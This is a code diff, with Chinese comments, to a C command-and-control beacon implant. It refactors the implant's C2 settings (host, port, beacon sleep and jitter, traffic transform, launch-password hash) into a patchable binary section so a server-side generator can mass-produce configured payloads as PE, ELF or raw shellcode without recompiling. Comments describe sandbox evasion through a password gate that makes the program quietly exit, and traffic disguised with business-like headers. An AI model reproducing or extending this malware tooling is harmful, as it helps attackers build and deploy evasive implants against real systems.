@@ -31,31 +31,83 @@
 #include "wmi.h"
 #include "token_gate.h"
 
-/* ---------------------------------------------------------- 编译期配置 */
+/* ---------------------------------------------------------- 配置
+ *
+ * 分两层:
+ *   1) **编译期默认值** (C2_*_DEF): 用 -D 覆盖, 是模板构建时的基准值。
+ *   2) **运行时配置槽** (g_c2cfg):   服务端生成载荷时按偏移覆写的一段固定布局字节。
+ *
+ * 为什么要有第 2 层: 原先配置全靠 -D 注入, 于是每生成一个载荷都要**重新调 gcc 编译** ——
+ * 生成端必须装 MinGW + PowerShell, 这是个很重的环境负担。
+ * 现在把编译挪到项目构建期 (产出"模板"), 生成时只把配置写进模板副本, 生成端零工具链。
+ *
+ * 定位方式: 槽位开头是 8 字节高熵标记, 生成器在二进制里扫描它。
+ * 用高熵非打印字节 (而不是 "RGC2CFG" 这种可读串) 是为了避免与代码里的字符串常量撞上 ——
+ * 生成器要求**全文件恰好命中一次**, 命中 0 次或多次都直接报错。
+ * 这样 PE / ELF / raw shellcode 三种形态可以用同一套定位逻辑, 不依赖节表。
+ */
 
-#ifndef C2_HOST
-#define C2_HOST   "127.0.0.1"
+/* ---- 编译期默认值 ---- */
+
+#ifdef C2_HOST
+#define C2_HOST_DEF C2_HOST
+#else
+#define C2_HOST_DEF "127.0.0.1"
 #endif
-#ifndef C2_PORT
-#define C2_PORT   8443
+
+#ifdef C2_PORT
+#define C2_PORT_DEF C2_PORT
+#else
+#define C2_PORT_DEF 8443
 #endif
-#ifndef C2_SSL
-#define C2_SSL    0
+
+#ifdef C2_SSL
+#define C2_SSL_DEF C2_SSL
+#else
+#define C2_SSL_DEF 0
 #endif
-#ifndef C2_URI
-#define C2_URI    "/submit"
+
+#ifdef C2_URI
+#define C2_URI_DEF C2_URI
+#else
+#define C2_URI_DEF "/submit"
 #endif
-#ifndef C2_SLEEP
-#define C2_SLEEP  5000u
+
+#ifdef C2_SLEEP
+#define C2_SLEEP_DEF C2_SLEEP
+#else
+#define C2_SLEEP_DEF 5000u
 #endif
-#ifndef C2_JITTER
-#define C2_JITTER 10
+
+#ifdef C2_JITTER
+#define C2_JITTER_DEF C2_JITTER
+#else
+#define C2_JITTER_DEF 10
 #endif
+
+#ifdef C2_XFORM
+#define C2_XFORM_DEF C2_XFORM
+#else
+#define C2_XFORM_DEF "raw"
+#endif
+
+#ifdef C2_TOKEN_HASH
+#define C2_GATE_DEF 1
+#define C2_TOKEN_HASH_DEF C2_TOKEN_HASH
+#ifdef C2_TOKEN_SALT
+#define C2_TOKEN_SALT_DEF C2_TOKEN_SALT
+#else
+#define C2_TOKEN_SALT_DEF ""
+#endif
+#else
+#define C2_GATE_DEF 0
+#define C2_TOKEN_HASH_DEF ""
+#define C2_TOKEN_SALT_DEF ""
+#endif
+
+/* 结构性开关保持编译期: 它们决定链接什么、代码怎么长, 不是"值" */
 #ifndef C2_CHUNK
 #define C2_CHUNK  (512u * 1024u)     /* 文件分块大小 */
-#endif
-#ifndef C2_XFORM
-#define C2_XFORM  "raw"              /* profile body 变换链, 如 "base64" 或 "base64+mask" */
 #endif
 #ifndef C2_TRANSPORT_TCP
 #define C2_TRANSPORT_TCP 0           /* 1 = 使用 TCP 承载层 (对应服务端 --tcp) */
@@ -74,7 +126,7 @@
  *   "把会话标识放进某个头部"。服务端不做强校验, 但真实流量里带一个业务化的
  *   头 (而不是清一色的 application/octet-stream) 更贴近正常请求。 */
 #ifndef C2_ID_HEADER
-#define C2_ID_HEADER ""              /* 空 = 不带 (生成器 -IdHeader) */
+#define C2_ID_HEADER ""              /* 空 = 不带 */
 #endif
 #ifndef C2_ID_VALUE
 #define C2_ID_VALUE ""
@@ -82,6 +134,143 @@
 #ifndef C2_PIPE
 #define C2_PIPE "\\\\.\\pipe\\csdev_pipe"
 #endif
+
+/* ---- 运行时配置槽 ----
+ *
+ * 布局必须与 go/gen_native.go 的 cfgLayout 表**逐字节对应**。
+ * 改字段要同时改两处并递增 C2_CFG_VERSION, 否则生成器写进去的旧载荷会读错位。 */
+
+#define C2_CFG_VERSION 1u
+
+typedef struct {
+    unsigned char magic[8];          /*  0   定位标记 */
+    unsigned int  version;           /*  8   0 = 未启用 (用编译期默认值) */
+    unsigned int  port;              /* 12 */
+    unsigned int  sleep_ms;          /* 16 */
+    unsigned int  jitter;            /* 20 */
+    unsigned int  flags;             /* 24   bit0 = 启用 TLS */
+    unsigned int  nonce;             /* 28   每次生成随机, 让不同载荷这段字节不同 */
+    char          host[128];         /* 32 */
+    char          uri[64];           /* 160 */
+    char          xform[32];         /* 224 */
+    char          token_salt[24];    /* 256 */
+    char          token_hash[72];    /* 280 */
+    char          id_header[48];     /* 352 */
+    char          id_value[80];      /* 400 */
+    unsigned char reserved[32];      /* 480 */
+} C2_RUNTIME_CFG;                    /* 合计 512 */
+
+/* 模板里的初始状态: 标记就位 (供生成器定位), version=0 → 未启用。
+ * 这样手工 gcc 编译出来的模板仍然完全按编译期默认值跑。
+ *
+ * 放在独立节 `.c2cfg` 里有两个好处:
+ *   1) 生成器可以直接查节表定位, 不必只靠扫描;
+ *   2) raw shellcode 那份是用 `objcopy --only-section=.text` 提取的, 默认会把
+ *      .rdata 整个丢掉 —— 配置槽必须有自己可点名的节, 才能被一起提取出来。 */
+__attribute__((section(".c2cfg"), used))
+static const C2_RUNTIME_CFG g_c2cfg = {
+    { 0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C },
+    0u, 0u, 0u, 0u, 0u, 0u,
+    "", "", "", "", "", "", "",
+    { 0 }
+};
+
+/* 槽位是否已被生成器写入。
+ * 只判 version + host —— **不要**在这里再写一份 magic 数组去比对:
+ * 那会让 8 个标记字节在文件里出现两次, 破坏生成器"恰好命中一次"的校验。 */
+static int c2cfg_ok(void)
+{
+    return g_c2cfg.version == C2_CFG_VERSION && g_c2cfg.host[0] != '\0';
+}
+
+/* ---- 取值访问器 (运行时有值就用, 否则退回编译期默认) ---- */
+
+static const char *c2cfg_host(void)
+{
+    return c2cfg_ok() ? g_c2cfg.host : C2_HOST_DEF;
+}
+
+static unsigned short c2cfg_port(void)
+{
+    unsigned int p = c2cfg_ok() ? g_c2cfg.port : (unsigned int)C2_PORT_DEF;
+    if (p == 0u || p > 65535u) p = (unsigned int)C2_PORT_DEF;
+    return (unsigned short)p;
+}
+
+static const char *c2cfg_uri(void)
+{
+    return (c2cfg_ok() && g_c2cfg.uri[0]) ? g_c2cfg.uri : C2_URI_DEF;
+}
+
+static unsigned int c2cfg_sleep(void)
+{
+    unsigned int v = c2cfg_ok() ? g_c2cfg.sleep_ms : (unsigned int)C2_SLEEP_DEF;
+    if (v < 50u) v = 50u;                 /* 下界保护: 别把自己跑成忙等 */
+    if (v > 3600000u) v = 3600000u;
+    return v;
+}
+
+static unsigned int c2cfg_jitter(void)
+{
+    unsigned int v = c2cfg_ok() ? g_c2cfg.jitter : (unsigned int)C2_JITTER_DEF;
+    if (v > 90u) v = 90u;
+    return v;
+}
+
+static int c2cfg_ssl(void)
+{
+    return c2cfg_ok() ? (int)(g_c2cfg.flags & 1u) : (C2_SSL_DEF ? 1 : 0);
+}
+
+static const char *c2cfg_xform(void)
+{
+    return (c2cfg_ok() && g_c2cfg.xform[0]) ? g_c2cfg.xform : C2_XFORM_DEF;
+}
+
+static const char *c2cfg_id_header(void)
+{
+    return (c2cfg_ok() && g_c2cfg.id_header[0]) ? g_c2cfg.id_header : C2_ID_HEADER;
+}
+
+static const char *c2cfg_id_value(void)
+{
+    return (c2cfg_ok() && g_c2cfg.id_value[0]) ? g_c2cfg.id_value : C2_ID_VALUE;
+}
+
+/* 供 token_gate.h 使用 (它在两个平台上共用, 所以只依赖这两个符号) */
+const char *c2_gate_salt(void)
+{
+    return c2cfg_ok() ? g_c2cfg.token_salt : C2_TOKEN_SALT_DEF;
+}
+
+const char *c2_gate_hash(void)
+{
+    return c2cfg_ok() ? g_c2cfg.token_hash : C2_TOKEN_HASH_DEF;
+}
+
+/* ---- 把调用点重定向到访问器 ----
+ * 这样做的好处是**只改这一处**, 二十来个使用点原样不动。 */
+#undef C2_HOST
+#undef C2_PORT
+#undef C2_SSL
+#undef C2_URI
+#undef C2_SLEEP
+#undef C2_JITTER
+#undef C2_XFORM
+#undef C2_ID_HEADER
+#undef C2_ID_VALUE
+#undef C2_TOKEN_HASH
+#undef C2_TOKEN_SALT
+
+#define C2_HOST       c2cfg_host()
+#define C2_PORT       c2cfg_port()
+#define C2_SSL        c2cfg_ssl()
+#define C2_URI        c2cfg_uri()
+#define C2_SLEEP      c2cfg_sleep()
+#define C2_JITTER     c2cfg_jitter()
+#define C2_XFORM      c2cfg_xform()
+#define C2_ID_HEADER  c2cfg_id_header()
+#define C2_ID_VALUE   c2cfg_id_value()
 
 #define MAX_PLAIN (1536u * 1024u)
 #define MAX_FRAME (MAX_PLAIN + 1024u)
@@ -2358,8 +2547,8 @@ static void run_task(const cs_task *t)
 
 /* ------------------------------------------------------------ 主循环 */
 
-#ifdef C2_TOKEN_HASH
-/* 把整条命令行拷进调用方缓冲(GUI 子系统下 WinMain 拿不到 argv, 只能问 kernel32) */
+/* 把整条命令行拷进调用方缓冲(GUI 子系统下 WinMain 拿不到 argv, 只能问 kernel32)。
+ * 无条件编译: 启用与否现在是运行期判定的 (见 beacon_run), 不再是编译期开关。 */
 static void GetCommandLineA_into(char *dst, unsigned int cap)
 {
     const char *p = GetCommandLineA();
@@ -2373,18 +2562,20 @@ static void GetCommandLineA_into(char *dst, unsigned int cap)
     }
     dst[i] = '\0';
 }
-#endif
 
 int beacon_run(void)
 {
     unsigned int flen, rlen;
     int plen;
 
-#ifdef C2_TOKEN_HASH
     /* 启动口令门控: 命令行(或环境变量)里没有正确口令就安静退出。
      * 放在最前面 —— 早于任何内存分配、反调试、联网动作, 沙箱直接双击运行时
-     * 只能看到一个"跑完就结束"的普通程序。生成时不给 -Password 则这段不编译。 */
-    {
+     * 只能看到一个"跑完就结束"的普通程序。
+     *
+     * 启用与否是**运行期**判定的: 看配置槽里有没有写入口令摘要。
+     * 生成时不填口令, 槽位里就是空串, 这段直接跳过 ——
+     * 于是同一个模板既能生成带门控的载荷, 也能生成不带的, 不必分两套模板。 */
+    if (c2_gate_hash()[0] != '\0') {
         char gate_buf[1024];
         const char *env = getenv("CSDEV_TOKEN");
         if (env && cs_token_match(env)) {
@@ -2397,7 +2588,6 @@ int beacon_run(void)
             }
         }
     }
-#endif
 
     g_tx  = (unsigned char *)VirtualAlloc(NULL, MAX_FRAME, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     g_rx  = (unsigned char *)VirtualAlloc(NULL, MAX_FRAME, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
